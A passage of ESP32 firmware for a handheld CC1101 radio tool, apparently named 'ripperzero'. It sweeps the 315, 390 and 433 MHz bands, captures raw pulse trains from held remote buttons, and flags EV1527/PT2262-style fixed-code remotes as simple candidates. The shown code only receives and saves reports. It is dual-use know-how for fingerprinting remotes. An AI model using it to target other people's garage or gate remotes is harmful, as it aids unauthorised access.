      set_rf_scope_caption("NO CLEAR SIGNAL - MOVE CLOSER AND SCAN AGAIN");
      if (rf_scope_scan_button != NULL) {
        lv_label_set_text(lv_obj_get_child(rf_scope_scan_button, 0), "SCAN AGAIN");
      }
      return;
    }
    rf_scope_fine_refining = true;
    rf_scope_auto_band = 3;
    char refinement_message[96];
    snprintf(refinement_message, sizeof(refinement_message),
             "Signal found near %.2f MHz.\nKeep holding the same button.",
             rf_scope_auto_best_mhz);
    set_rf_scope_state("REFINING", COLOR_RF);
    set_rf_scope_caption(refinement_message);
    const float fine_start = rf_scope_auto_best_mhz - 1.0f;
    const float fine_stop = rf_scope_auto_best_mhz + 1.0f;
    run_rf_scope_sweep(fine_start, fine_stop, rf_scope_auto_best_profile);
    return;
  }

  if (rf_scope_auto_analyze && rf_scope_fine_refining) {
    rf_scope_auto_analyze = false;
    rf_scope_fine_refining = false;
    rf_scope_auto_best_mhz = rf_scope_sweep_best_mhz;
    rf_scope_auto_best_rssi = rf_scope_sweep_best_rssi;
    apply_rf_profile(rf_scope_auto_best_profile, false);
    cc1101.setFrequency(rf_scope_auto_best_mhz);
    // The sweep is finished. Clear the SWEEP state so SCAN AGAIN is not
    // rejected forever as "RF ANALYZER BUSY".
    rf_scope_mode = RF_SCOPE_MODE_LIVE;
    rf_scope_active = false;
    rf_scope_capture_frequency = rf_scope_auto_best_mhz;
    rf_profile_last_rssi = rf_scope_auto_best_rssi;
    set_rf_scope_state("LOCKED", COLOR_GREEN);
    lv_label_set_text_fmt(rf_scope_profile_label, "STRONGEST %.2f MHz", rf_scope_capture_frequency);
    lv_label_set_text_fmt(rf_scope_rssi_label, "PEAK %.1f dBm\nCAPTURING NEXT", rf_scope_auto_best_rssi);
    set_rf_scope_caption("REFINED CC1101 RSSI ESTIMATE / STARTING CAPTURE");
    rf_scope_frequency_locked = true;
    char capture_message[96];
    snprintf(capture_message, sizeof(capture_message),
             "Estimated carrier: %.3f MHz\nCapturing signal... keep holding.",
             rf_scope_capture_frequency);
    set_rf_scope_caption(capture_message);
    refresh_rf_scope_tab();
    open_rf_scope_pulse_capture(NULL);
    return;
  }

  // Restore the modulation preset, then remain tuned to the actual strongest
  // frequency so a manual capture analyzes what the sweep just found.
  apply_rf_profile(rf_scope_sweep_profile_index, false);
  cc1101.setFrequency(rf_scope_sweep_best_mhz);
  rf_scope_mode = RF_SCOPE_MODE_LIVE;
  rf_scope_active = false;
  rf_scope_capture_frequency = rf_scope_sweep_best_mhz;
  rf_profile_last_rssi = rf_scope_sweep_best_rssi;
  render_rf_scope_sweep(rf_scope_sweep_start_mhz, rf_scope_sweep_stop_mhz,
                        rf_scope_sweep_best_mhz, rf_scope_sweep_best_rssi);
  refresh_rf_scope_tab();
  set_rf_scope_caption("SCAN DONE / TAP CAPTURE SIGNAL, THEN HOLD THE SAME BUTTON");
  set_status("SCAN COMPLETE", COLOR_GREEN);
  Serial.printf("RF scope sweep %.0f-%.0f MHz: peak %.1f dBm at %.2f MHz\n",
                rf_scope_sweep_start_mhz, rf_scope_sweep_stop_mhz,
                rf_scope_sweep_best_rssi, rf_scope_sweep_best_mhz);
#endif
}


void open_rf_scope_pulse_capture(lv_event_t *e) {
  rf_scope_waterfall_live = false;
  if (!rf_scope_frequency_locked) {
    set_status("LOCK A SIGNAL FIRST", COLOR_RED);
    return;
  }
  if (!cc1101_ready || rf_capture_active) {
    set_status("CC1101 NOT READY", COLOR_RED);
    return;
  }
  rf_scope_active = false;
  rf_scope_mode = RF_SCOPE_MODE_PULSE;
  rf_scope_capture_mode = true;
  rf_scope_tab = 1;
  set_rf_scope_state("CAPTURING", COLOR_RF);
  refresh_rf_scope_tab();
  rf_scope_capture_started_ms = millis();
  cc1101.packetMode();
  clear_rf_scope_bars();
  if (rf_scope_axis_label != NULL) lv_label_set_text(rf_scope_axis_label, "CAPTURING RAW GDO0 ENVELOPE");
  lv_label_set_text_fmt(rf_scope_profile_label, "CAPTURING | %.2f MHz", rf_scope_capture_frequency);
  lv_label_set_text(rf_scope_rssi_label, "HOLD BUTTON\n5 SECOND CAPTURE");
  set_rf_scope_caption("CAPTURE RUNS FOR 5 SECONDS / KEEP HOLDING");
  if (start_rf_capture()) {
    set_rf_scope_state("CAPTURING", COLOR_RF);
  } else {
    rf_scope_capture_mode = false;
    set_status("RF CAPTURE START FAILED", COLOR_RED);
  }
}

void lock_rf_scope_strongest(lv_event_t *e) {
  if (rf_scope_auto_best_mhz <= 0.0f) {
    set_status("SCAN FIRST", COLOR_RED);
    return;
  }
  rf_scope_frequency_locked = true;
  rf_scope_tab = 0;
  apply_rf_profile(rf_scope_auto_best_profile, false);
  cc1101.setFrequency(rf_scope_auto_best_mhz);
  rf_scope_capture_frequency = rf_scope_auto_best_mhz;
  set_rf_scope_state("LOCKED", COLOR_GREEN);
  lv_label_set_text_fmt(rf_scope_profile_label, "LOCKED %.2f MHz", rf_scope_capture_frequency);
  lv_label_set_text(rf_scope_rssi_label, "OOK / ASK LIKELY\nREADY TO CAPTURE");
  set_rf_scope_caption("LOCKED / TAP WAVEFORM OR CAPTURE, THEN HOLD THE BUTTON");
  lv_obj_add_flag(rf_scope_lock_button, LV_OBJ_FLAG_HIDDEN);
  lv_obj_clear_flag(rf_scope_capture_button, LV_OBJ_FLAG_HIDDEN);
  refresh_rf_scope_tab();
}

uint32_t estimate_rf_bit_time(uint16_t edges) {
  uint16_t bins[57] = {};
  for (uint16_t i = 0; i < edges; i++) {
    uint32_t duration = rf_capture_durations[i];
    if (duration >= 150 && duration <= 1550) bins[(duration - 150) / 25]++;
  }
  uint8_t best = 0;
  for (uint8_t i = 1; i < 57; i++) if (bins[i] > bins[best]) best = i;
  return bins[best] ? 150U + best * 25U + 12U : 0U;
}

bool looks_like_common_24bit_fixed_code(uint16_t edges) {
  for (uint16_t start = 0; start + 48 <= edges; start++) {
    bool valid = true;
    for (uint8_t bit = 0; bit < 24; bit++) {
      uint16_t i = start + bit * 2;
      uint32_t first = rf_capture_durations[i];
      uint32_t second = rf_capture_durations[i + 1];
      uint32_t shorter = min(first, second);
      uint32_t longer = max(first, second);
      if (shorter < 100 || shorter > 900 || longer < shorter * 2 ||
          longer > shorter * 5 || rf_capture_levels[i] == rf_capture_levels[i + 1]) {
        valid = false;
        break;
      }
    }
    if (valid) return true;
  }
  return false;
}

void save_rf_analysis_report(lv_event_t *e) {
  if (!rf_scope_report_ready) {
    set_status("CAPTURE A SIGNAL FIRST", COLOR_RED);
    return;
  }
  RfAnalysisReport report = {};
  report.magic = 0x52464131UL;
  report.frequency_mhz = rf_scope_capture_frequency;
  report.peak_rssi = rf_capture_peak_rssi;
  report.edges = rf_scope_report_edges;
  report.shortest_us = rf_scope_report_shortest;
  report.longest_us = rf_scope_report_longest;
  report.bit_us = rf_scope_report_bit_us;
  report.repeats = rf_scope_report_repeats ? 1 : 0;
  strlcpy(report.likely_profile, rf_scope_report_profile, sizeof(report.likely_profile));
  if (rtc_ready && rtc.isClockIntegrityGuaranteed()) {
    RTC_DateTime now = rtc.getDateTime();
    format_clock_text(report.date_time, sizeof(report.date_time), now, true);
  } else {
    strlcpy(report.date_time, "DATE NOT SET", sizeof(report.date_time));
  }
  saved_preferences.begin("ripperzero", false);
  const uint32_t sequence = saved_preferences.getUInt("rfReportSeq", 0) + 1;
  saved_preferences.putUInt("rfReportSeq", sequence);
  const bool internal_saved =
    saved_preferences.putBytes("lastRfReport", &report, sizeof(report)) == sizeof(report);
  saved_preferences.end();

  bool sd_saved = false;
  if (sd_card_ready) {
    File file = SD_MMC.open("/rf_analysis_reports.csv", FILE_APPEND);
    if (file) {
      if (file.size() == 0) {
        file.println("sequence,date_time,frequency_mhz,classification,peak_rssi_dbm,edges,shortest_us,longest_us,estimated_bit_us,repeats");
      }
      sd_saved = file.printf("%lu,%s,%.3f,%s,%.1f,%u,%lu,%lu,%lu,%s\n",
                             (unsigned long)sequence, report.date_time,
                             report.frequency_mhz, report.likely_profile,
                             report.peak_rssi, report.edges,
                             (unsigned long)report.shortest_us,
                             (unsigned long)report.longest_us,
                             (unsigned long)report.bit_us,
                             report.repeats ? "YES" : "NO") > 0;
      file.close();
      if (sd_saved) sd_card_used_bytes = SD_MMC.usedBytes();
    }
  }

  if (sd_saved) {
    set_status("RF REPORT SAVED TO SD", COLOR_GREEN);
    set_rf_scope_caption("SAVED TO /rf_analysis_reports.csv");
  } else if (!sd_card_ready) {
    set_status("SD CARD NOT READY", COLOR_RED);
    set_rf_scope_caption(internal_saved ?
      "SD UNAVAILABLE / LAST REPORT KEPT INTERNALLY" :
      "RF REPORT COULD NOT BE SAVED");
  } else {
    set_status("SD REPORT SAVE FAILED", COLOR_RED);
    set_rf_scope_caption(internal_saved ?
      "SD WRITE FAILED / LAST REPORT KEPT INTERNALLY" :
      "RF REPORT COULD NOT BE SAVED");
  }
  Serial.printf("RF analysis report #%lu: internal=%s SD=%s\n",
                (unsigned long)sequence,
                internal_saved ? "SAVED" : "FAILED",
                sd_saved ? "/rf_analysis_reports.csv" : "FAILED");
}


void finish_rf_scope_pulse_capture() {
  if (rf_rmt_ready && rmtReceiveCompleted(CC1101_GDO0)) {
    rf_capture_edge_count = 0;
    for (size_t i = 0; i < rf_rmt_symbol_count &&
         rf_capture_edge_count + 1 < RF_CAPTURE_MAX_EDGES; i++) {
      if (rf_rmt_symbols[i].duration0 >= RF_CAPTURE_MIN_PULSE_US) {
        rf_capture_durations[rf_capture_edge_count] = rf_rmt_symbols[i].duration0;
        rf_capture_levels[rf_capture_edge_count++] = rf_rmt_symbols[i].level0;
      }
      if (rf_rmt_symbols[i].duration1 >= RF_CAPTURE_MIN_PULSE_US) {
        rf_capture_durations[rf_capture_edge_count] = rf_rmt_symbols[i].duration1;
        rf_capture_levels[rf_capture_edge_count++] = rf_rmt_symbols[i].level1;
      }
    }
  }

  uint16_t edges = rf_capture_edge_count;
  float peak_rssi = rf_capture_peak_rssi;
  bool carrier_seen = rf_capture_carrier_seen;
  stop_rf_capture();
  rf_scope_capture_mode = false;

  if (!carrier_seen || edges < 20) {
    rf_scope_report_ready = false;
    lv_obj_add_flag(rf_scope_save_button, LV_OBJ_FLAG_HIDDEN);
    clear_rf_scope_bars();
    lv_label_set_text(rf_scope_profile_label, "NO CLEAN RAW PULSE TRAIN");
    lv_label_set_text_fmt(rf_scope_rssi_label, "EDGES %u\nPEAK %.1f dBm", edges, peak_rssi);
    set_rf_scope_caption("TRY CLOSER, HOLD THE BUTTON, OR CHANGE PROFILE");
    set_status("SYSTEM READY", COLOR_READY);
    set_rf_scope_state("NO SIGNAL", COLOR_RED);
    set_rf_scope_caption("CAPTURE INCOMPLETE - MOVE CLOSER AND SCAN AGAIN");
    if (rf_scope_scan_button != NULL) {
      lv_label_set_text(lv_obj_get_child(rf_scope_scan_button, 0), "SCAN AGAIN");
    }
    rf_scope_tab = 2;
    refresh_rf_scope_tab();
    play_board_tone(220, 90);
    Serial.printf("RF scope pulse capture rejected: edges=%u peak=%.1f dBm carrier=%s\n",
                  edges, peak_rssi, carrier_seen ? "YES" : "NO");
    return;
  }

  uint32_t shortest = UINT32_MAX;
  uint32_t longest = 0;
  uint16_t short_pulses = 0;
  uint16_t long_gaps = 0;
  for (uint16_t i = 0; i < edges; i++) {
    uint32_t duration = rf_capture_durations[i];
    if (duration < shortest) shortest = duration;
    if (duration > longest) longest = duration;
    if (duration <= 1200) short_pulses++;
    if (duration >= 5000) long_gaps++;
  }
  const bool pulse_train = short_pulses * 100U >= edges * 60U;
  uint16_t repeated_start = 0;
  uint16_t repeated_edges = 0;
  const bool has_repeated_frame = find_repeated_rf_frame(repeated_start, repeated_edges);
  const bool common_fixed_code = looks_like_common_24bit_fixed_code(edges);
  const char *analysis = common_fixed_code ? "EV1527/PT2262-LIKE" :
    (pulse_train ? "LIKELY OOK / ASK" : "POSSIBLE FSK / OTHER");
  const uint32_t bit_time = estimate_rf_bit_time(edges);
  rf_scope_report_ready = true;
  rf_scope_report_edges = edges;
  rf_scope_report_shortest = shortest;
  rf_scope_report_longest = longest;
  rf_scope_report_bit_us = bit_time;
  rf_scope_report_repeats = has_repeated_frame;
  strlcpy(rf_scope_report_profile, analysis, sizeof(rf_scope_report_profile));
  render_rf_scope_pulse_trace(edges);
  lv_label_set_text_fmt(rf_scope_profile_label, "%s | %u EDGES", analysis, edges);
  lv_label_set_text_fmt(rf_scope_rssi_label, "PEAK %.1f dBm\n%s",
                        peak_rssi, has_repeated_frame ? "REPEATS FOUND" : "NO REPEAT");
  lv_obj_clear_flag(rf_scope_save_button, LV_OBJ_FLAG_HIDDEN);
  set_rf_scope_state("COMPLETE", COLOR_GREEN);
  if (rf_scope_scan_button != NULL) {
    lv_label_set_text(lv_obj_get_child(rf_scope_scan_button, 0), "SCAN AGAIN");
  }
  if (has_repeated_frame) {
    set_rf_scope_caption("REPEATED RAW FRAME FOUND / SIMPLE REMOTE CANDIDATE");
  } else if (long_gaps > 0) {
    set_rf_scope_caption("FRAME GAP FOUND / HOLD BUTTON LONGER TO CHECK REPEAT");
  } else {
    set_rf_scope_caption("RAW ENVELOPE / NO FRAME GAP FOUND / NOT DECODED");
  }
  set_status("SYSTEM READY", COLOR_READY);
  rf_scope_tab = 1;
  refresh_rf_scope_tab();
  play_board_tone(has_repeated_frame ? 1200 : 820, 65);
  Serial.printf("RF analysis: %s, edges=%u, pulse=%u, gaps=%u, repeated=%s frame=%u@%u, range=%lu-%luus, peak=%.1f dBm\n",
                analysis, edges, short_pulses, long_gaps,
                has_repeated_frame ? "YES" : "NO", repeated_edges, repeated_start,
                (unsigned long)shortest, (unsigned long)longest, peak_rssi);
}


void open_rf_scope(lv_event_t *e) {
  if (!cc1101_ready) {
    set_status("CC1101 NOT READY", COLOR_RED);
    return;
  }
  if (rf_capture_active) {
    set_status("RF CAPTURE BUSY", COLOR_RED);
    return;
  }
  stop_live_rf_scanner();
  if (rf_scope_screen == NULL) create_rf_scope_screen();

  if (rf_analyzer_preferred_frequency > 0.0f &&
      rf_analyzer_preferred_profile < RF_PROFILE_COUNT) {
    apply_rf_profile(rf_analyzer_preferred_profile, false);
    cc1101.setFrequency(rf_analyzer_preferred_frequency);
    rf_scope_capture_frequency = rf_analyzer_preferred_frequency;
  }

#if CC1101_ACCESS_ENABLED
  if (cc1101.receiveDirectAsync() != RADIOLIB_ERR_NONE) {
    set_status("RF SCOPE START FAILED", COLOR_RED);
    return;
  }
#endif
  memset(rf_scope_levels, 0, sizeof(rf_scope_levels));
  rf_scope_peak_rssi = -140.0f;
  rf_scope_last_sample_ms = 0;
  rf_scope_last_label_ms = 0;
  rf_scope_capture_mode = false;
  rf_scope_mode = RF_SCOPE_MODE_LIVE;
  rf_scope_auto_analyze = false;
  rf_scope_waterfall_live = false;
  rf_scope_waterfall_band = 0;
  rf_scope_frequency_locked = false;
  rf_scope_report_ready = false;
  rf_scope_tab = 0;
  rf_scanner_normal_flow = false;
  lv_obj_add_flag(rf_scope_lock_button, LV_OBJ_FLAG_HIDDEN);
  lv_obj_add_flag(rf_scope_capture_button, LV_OBJ_FLAG_HIDDEN);
  lv_obj_add_flag(rf_scope_save_button, LV_OBJ_FLAG_HIDDEN);
  const uint8_t active_profile_index = safe_rf_profile_index();
  if (rf_analyzer_preferred_frequency <= 0.0f) {
    rf_scope_capture_frequency = RF_PROFILES[active_profile_index].frequency;
  }
  rf_analyzer_preferred_frequency = 0.0f;
  rf_scope_active = true;
  clear_rf_scope_bars();
  clear_rf_scope_waterfall();
  set_rf_scope_state("READY", COLOR_GREEN);
  refresh_rf_scope_labels();
  set_rf_scope_caption("READY - TAP SCAN, THEN HOLD ONE REMOTE BUTTON");
  if (rf_scope_axis_label != NULL) {
    lv_label_set_text(rf_scope_axis_label, "SWEPT CC1101 RSSI / ACTIVITY");
  }
  refresh_rf_scope_tab();
  lv_scr_load(rf_scope_screen);
  Serial.printf("RF scope listening on %.2f MHz (%s)\n",
                RF_PROFILES[active_profile_index].frequency,
                RF_PROFILES[active_profile_index].name);
}


void close_rf_scope(lv_event_t *e) {
  const bool return_to_scanner = rf_scanner_normal_flow && rf_scope_report_ready &&
                                 rf_scanner_screen != NULL;
  rf_scope_active = false;
  rf_scope_capture_mode = false;
  rf_scope_auto_analyze = false;
  rf_scope_waterfall_live = false;
  rf_scope_fine_refining = false;
  if (!return_to_scanner) rf_scanner_normal_flow = false;
  rf_scope_mode = RF_SCOPE_MODE_LIVE;
#if CC1101_ACCESS_ENABLED
  if (rf_capture_active) stop_rf_capture();
  else if (cc1101_ready) cc1101.packetMode();
#endif
  lv_scr_load(return_to_scanner ? rf_scanner_screen : rf_screen);
  set_status(return_to_scanner ? "SIGNAL RESULT" : "SYSTEM READY",
             return_to_scanner ? COLOR_GREEN : COLOR_READY);
}


void update_rf_scope() {
  if (rf_scope_mode == RF_SCOPE_MODE_SWEEP) {
    update_rf_scope_sweep();
    return;
  }
  if (rf_scope_capture_mode && rf_capture_active &&
      (uint32_t)(millis() - rf_scope_capture_started_ms) >= 5000) {
    finish_rf_scope_pulse_capture();
    return;
  }
  if (!rf_scope_active || rf_scope_mode != RF_SCOPE_MODE_LIVE ||
      !cc1101_ready || rf_scope_screen == NULL) return;
  const uint32_t now = millis();
  if ((uint32_t)(now - rf_scope_last_sample_ms) < 70) return;
  rf_scope_last_sample_ms = now;

#if CC1101_ACCESS_ENABLED
  const float rssi = cc1101.getRSSI();
#else
  const float rssi = -140.0f;
#endif
  rf_profile_last_rssi = rssi;
  if (rssi > rf_scope_peak_rssi) rf_scope_peak_rssi = rssi;

  // The CC1101 reports signal power, not a decoded waveform.  This trace
  // intentionally shows real radio activity while avoiding a misleading
  // claim that an unknown protocol has been decoded.
  int level = (int)((rssi + 105.0f) * 100.0f / 80.0f);
  if (level < 0) level = 0;
  if (level > 100) level = 100;
  memmove(&rf_scope_levels[0], &rf_scope_levels[1], RF_SCOPE_BAR_COUNT - 1);
  rf_scope_levels[RF_SCOPE_BAR_COUNT - 1] = (uint8_t)level;

  if (rf_scope_tab == 0) {
    for (uint8_t i = 0; i < RF_SCOPE_BAR_COUNT; i++) {
      if (rf_scope_bars[i] == NULL) continue;
      int bar_height = 4 + (rf_scope_levels[i] * 66) / 100;
      lv_obj_set_height(rf_scope_bars[i], bar_height);
      lv_obj_set_y(rf_scope_bars[i], 70 - bar_height);
      lv_obj_set_style_bg_color(rf_scope_bars[i],
        lv_color_hex(rf_scope_levels[i] >= 65 ? COLOR_GREEN : COLOR_RF), LV_PART_MAIN);
    }
    update_rf_scope_peak_marker();
  }

  if ((uint32_t)(now - rf_scope_last_label_ms) >= 280) {
    rf_scope_last_label_ms = now;
    refresh_rf_scope_labels();
  }
}


uint32_t rf_live_intensity_color(uint8_t level) {
  if (level >= 78) return COLOR_GREEN;
  if (level >= 55) return COLOR_RF;
  if (level >= 32) return COLOR_SETTINGS;
  return COLOR_PANEL;
}


const char *rf_live_band_name() {
  switch (rf_live_band) {
    case RF_LIVE_BAND_315: return "315 MHz";
    case RF_LIVE_BAND_390: return "390 MHz";
    case RF_LIVE_BAND_433: return "433 / 434 MHz";
    default: return "ALL BANDS";
  }
}


void rf_live_configure_sweep(uint8_t stage) {
  if (rf_live_band == RF_LIVE_BAND_315 || (rf_live_band == RF_LIVE_BAND_ALL && stage == 0)) {
    rf_live_start_mhz = 304.0f; rf_live_stop_mhz = 326.0f; rf_live_profile_index = 6;
  } else if (rf_live_band == RF_LIVE_BAND_390 || (rf_live_band == RF_LIVE_BAND_ALL && stage == 1)) {
    rf_live_start_mhz = 380.0f; rf_live_stop_mhz = 400.0f; rf_live_profile_index = 3;
  } else {
    rf_live_start_mhz = 420.0f; rf_live_stop_mhz = 447.0f; rf_live_profile_index = 2;
  }
  rf_live_point_count = rf_live_band == RF_LIVE_BAND_ALL ? 10 : RF_LIVE_SCAN_COLUMNS;
  if (rf_live_frequency_label != NULL) {
    if (rf_live_band == RF_LIVE_BAND_ALL) {
      lv_label_set_text(rf_live_frequency_label, "315 MHz  |  390 MHz  |  433 / 434 MHz");
    } else {
      lv_label_set_text_fmt(rf_live_frequency_label, "%.0f MHz                         %.0f MHz",
                            rf_live_start_mhz, rf_live_stop_mhz);
    }
  }
  rf_live_point_index = 0;
  rf_live_tune_pending = false;
  rf_live_next_action_ms = millis();
  if (!apply_rf_profile(rf_live_profile_index, false)) {
    rf_live_scanning = false;
    set_status("RF LIVE SCAN FAILED", COLOR_RED);
  }
}


void rf_live_render_completed_sweep() {
  uint8_t strongest_column = 0;
  for (uint8_t i = 0; i < RF_LIVE_SCAN_COLUMNS; i++) {
    if (rf_live_levels[i] > rf_live_peak_levels[i]) rf_live_peak_levels[i] = rf_live_levels[i];
    else if (rf_live_peak_levels[i] > 3) rf_live_peak_levels[i] -= 3;
    if (rf_live_levels[i] > rf_live_levels[strongest_column]) strongest_column = i;

    const uint16_t height = 3 + (rf_live_levels[i] * 72U) / 100U;
    if (rf_live_spectrum_bars[i] != NULL) {
      lv_obj_set_size(rf_live_spectrum_bars[i], 7, height);
      lv_obj_set_pos(rf_live_spectrum_bars[i], 10 + i * 9, 82 - height);
      lv_obj_set_style_bg_color(rf_live_spectrum_bars[i],
                                lv_color_hex(rf_live_intensity_color(rf_live_levels[i])), LV_PART_MAIN);
    }
    if (rf_live_peak_markers[i] != NULL) {
      const uint16_t marker_y = 82 - (rf_live_peak_levels[i] * 72U) / 100U;
      lv_obj_set_y(rf_live_peak_markers[i], marker_y);
      lv_obj_set_style_bg_opa(rf_live_peak_markers[i],
                              rf_live_peak_levels[i] > rf_live_levels[i] ? LV_OPA_90 : LV_OPA_TRANSP,
                              LV_PART_MAIN);
    }
  }

  memmove(&rf_live_waterfall_levels[1][0], &rf_live_waterfall_levels[0][0],
          (RF_LIVE_WATERFALL_ROWS - 1) * RF_LIVE_SCAN_COLUMNS);
  memcpy(rf_live_waterfall_levels[0], rf_live_levels, RF_LIVE_SCAN_COLUMNS);
  for (uint8_t row = 0; row < RF_LIVE_WATERFALL_ROWS; row++) {
    for (uint8_t column = 0; column < RF_LIVE_SCAN_COLUMNS; column++) {
      if (rf_live_waterfall[row][column] == NULL) continue;
      lv_obj_set_style_bg_color(rf_live_waterfall[row][column],
        lv_color_hex(rf_live_intensity_color(rf_live_waterfall_levels[row][column])), LV_PART_MAIN);
      lv_obj_set_style_bg_opa(rf_live_waterfall[row][column],
        rf_live_waterfall_levels[row][column] > 5 ? LV_OPA_90 : LV_OPA_20, LV_PART_MAIN);
    }
  }

  const float fraction = RF_LIVE_SCAN_COLUMNS > 1 ?
    (float)strongest_column / (RF_LIVE_SCAN_COLUMNS - 1) : 0.0f;
  if (rf_live_band == RF_LIVE_BAND_ALL) {
    if (strongest_column < 10) {
      rf_live_selected_frequency = 304.0f + ((float)strongest_column / 9.0f) * 22.0f;
      rf_live_selected_profile = 6;
    } else if (strongest_column < 21) {
      rf_live_selected_frequency = 380.0f + ((float)(strongest_column - 11) / 9.0f) * 20.0f;
      rf_live_selected_profile = 3;
    } else {
      rf_live_selected_frequency = 420.0f + ((float)(strongest_column - 22) / 9.0f) * 27.0f;
      rf_live_selected_profile = 2;
    }
  } else {
    rf_live_selected_frequency = rf_live_start_mhz + fraction * (rf_live_stop_mhz - rf_live_start_mhz);
    rf_live_selected_profile = rf_live_profile_index;
  }
  rf_live_selected_rssi = -105.0f + (rf_live_levels[strongest_column] * 80.0f / 100.0f);
  if (rf_live_peak_label != NULL) {
    lv_label_set_text_fmt(rf_live_peak_label, "PEAK %.2f MHz  |  %.0f dBm",
                          rf_live_selected_frequency, rf_live_selected_rssi);
  }
  if (rf_live_analyze_button != NULL) {
    lv_obj_clear_state(rf_live_analyze_button, LV_STATE_DISABLED);
  }
}


void rf_live_finish_sweep() {
  if (rf_live_band == RF_LIVE_BAND_ALL) {
    const uint8_t offset = rf_live_all_stage == 0 ? 0 : (rf_live_all_stage == 1 ? 11 : 22);
    memcpy(&rf_live_pending_all_levels[offset], rf_live_levels, 10);
    if (rf_live_all_stage < 2) {
      rf_live_all_stage++;
      rf_live_configure_sweep(rf_live_all_stage);
      return;
    }
    rf_live_pending_all_levels[10] = 0;
    rf_live_pending_all_levels[21] = 0;
    memcpy(rf_live_levels, rf_live_pending_all_levels, sizeof(rf_live_levels));
    rf_live_all_stage = 0;
  }
  rf_live_render_completed_sweep();
  if (rf_scanner_progress_bar != NULL) lv_bar_set_value(rf_scanner_progress_bar, 100, LV_ANIM_ON);
  rf_live_configure_sweep(0);
}


void start_live_rf_scanner() {
  if (!cc1101_ready || rf_capture_active) {
    set_status("CC1101 NOT READY", COLOR_RED);
    return;
  }
  rf_scope_active = false;
  rf_scope_auto_analyze = false;
  rf_scope_capture_mode = false;
  rf_live_hold = false;
  rf_live_scanning = true;
  memset(rf_live_levels, 0, sizeof(rf_live_levels));
  memset(rf_live_pending_all_levels, 0, sizeof(rf_live_pending_all_levels));
  rf_live_all_stage = 0;
  rf_live_configure_sweep(0);
  if (rf_live_status_label != NULL) lv_label_set_text(rf_live_status_label, "SWEEPING - RSSI RECEIVE ONLY");
  if (rf_live_hold_button != NULL) lv_label_set_text(lv_obj_get_child(rf_live_hold_button, 0), "HOLD");
  set_status("LIVE RF SCANNING", COLOR_RF);
}


void stop_live_rf_scanner() {
  if (!rf_live_scanning && !rf_live_tune_pending) return;
  rf_live_scanning = false;
  rf_live_tune_pending = false;
#if CC1101_ACCESS_ENABLED
  if (cc1101_ready) cc1101.packetMode();
#endif
}


void update_live_rf_scanner() {
#if CC1101_ACCESS_ENABLED
  if (!rf_live_scanning || rf_live_hold || rf_capture_active || !cc1101_ready) return;
  const uint32_t now = millis();
  if ((int32_t)(now - rf_live_next_action_ms) < 0) return;

  const float fraction = rf_live_point_count > 1 ?
    (float)rf_live_point_index / (rf_live_point_count - 1) : 0.0f;
  if (!rf_live_tune_pending) {
    rf_live_current_frequency = rf_live_start_mhz +
      (rf_live_stop_mhz - rf_live_start_mhz) * fraction;
    if (cc1101.setFrequency(rf_live_current_frequency) != RADIOLIB_ERR_NONE ||
        cc1101.receiveDirectAsync() != RADIOLIB_ERR_NONE) {
      rf_live_scanning = false;
      set_status("RF LIVE TUNE FAILED", COLOR_RED);
      return;
    }
    rf_live_tune_pending = true;
    rf_live_next_action_ms = now + 12;
    return;
  }

  float rssi = cc1101.getRSSI();
  cc1101.packetMode();
  int level = (int)((rssi + 105.0f) * 100.0f / 80.0f);
  rf_live_levels[rf_live_point_index] = constrain(level, 0, 100);
  rf_live_tune_pending = false;
  rf_live_point_index++;
  if (rf_scanner_progress_bar != NULL) {
    uint8_t progress = rf_live_point_index * 100U / rf_live_point_count;
    if (rf_live_band == RF_LIVE_BAND_ALL) progress = rf_live_all_stage * 33U + progress / 3U;
    lv_bar_set_value(rf_scanner_progress_bar, progress, LV_ANIM_OFF);
  }
  if (rf_live_point_index >= rf_live_point_count) rf_live_finish_sweep();
  else rf_live_next_action_ms = now + 2;
#endif
}


void cycle_live_rf_band(lv_event_t *e) {
  rf_live_band = (RfLiveBand)((rf_live_band + 1) % 4);
  if (rf_live_band_button != NULL) lv_label_set_text(lv_obj_get_child(rf_live_band_button, 0),
                                                       rf_live_band_name());
  start_live_rf_scanner();
}


void toggle_live_rf_hold(lv_event_t *e) {
  if (rf_live_hold) {
    start_live_rf_scanner();
  } else {
    rf_live_hold = true;
    stop_live_rf_scanner();
  }
  if (rf_live_hold_button != NULL) lv_label_set_text(lv_obj_get_child(rf_live_hold_button, 0),
                                                       rf_live_hold ? "RESUME" : "HOLD");
  if (rf_live_status_label != NULL) lv_label_set_text(rf_live_status_label,
    rf_live_hold ? "HELD - LAST COMPLETED SWEEP" : "SWEEPING - RSSI RECEIVE ONLY");
}


void select_live_rf_frequency(lv_event_t *e) {
  const uint8_t column = (uint8_t)(uintptr_t)lv_event_get_user_data(e);
  if (column >= RF_LIVE_SCAN_COLUMNS || (rf_live_band == RF_LIVE_BAND_ALL &&
      (column == 10 || column == 21))) return;
  if (rf_live_band == RF_LIVE_BAND_ALL) {
    if (column < 10) { rf_live_selected_frequency = 304.0f + (float)column * 22.0f / 9.0f; rf_live_selected_profile = 6; }
    else if (column < 21) { rf_live_selected_frequency = 380.0f + (float)(column - 11) * 20.0f / 9.0f; rf_live_selected_profile = 3; }
    else { rf_live_selected_frequency = 420.0f + (float)(column - 22) * 27.0f / 9.0f; rf_live_selected_profile = 2; }
  } else {
    rf_live_selected_frequency = rf_live_start_mhz + (float)column *
      (rf_live_stop_mhz - rf_live_start_mhz) / (RF_LIVE_SCAN_COLUMNS - 1);
    rf_live_selected_profile = rf_live_profile_index;
  }
  rf_live_selected_rssi = -105.0f + (rf_live_levels[column] * 80.0f / 100.0f);
  if (rf_live_peak_label != NULL) lv_label_set_text_fmt(rf_live_peak_label,
    "SELECTED %.2f MHz  |  %.0f dBm", rf_live_selected_frequency, rf_live_selected_rssi);
}


void analyze_live_rf_peak(lv_event_t *e) {
  if (rf_live_selected_frequency <= 0.0f) {
    set_status("WAIT FOR A SWEEP", COLOR_MUTED);
    return;
  }
  rf_analyzer_preferred_frequency = rf_live_selected_frequency;
  rf_analyzer_preferred_profile = rf_live_selected_profile;
  rf_live_previous_profile_valid = false;
  stop_live_rf_scanner();
  open_rf_scope(e);
}


void update_rf_scanner_stage(const char *stage, const char *message,
                             uint8_t progress, bool show_result_actions) {
  if (rf_scanner_stage_label == NULL || rf_scanner_result_label == NULL) return;
  lv_label_set_text(rf_scanner_stage_label, stage);
  lv_label_set_text(rf_scanner_result_label, message);
  if (rf_scanner_progress_bar != NULL) lv_bar_set_value(rf_scanner_progress_bar, progress, LV_ANIM_ON);
  if (rf_scanner_start_button != NULL) {
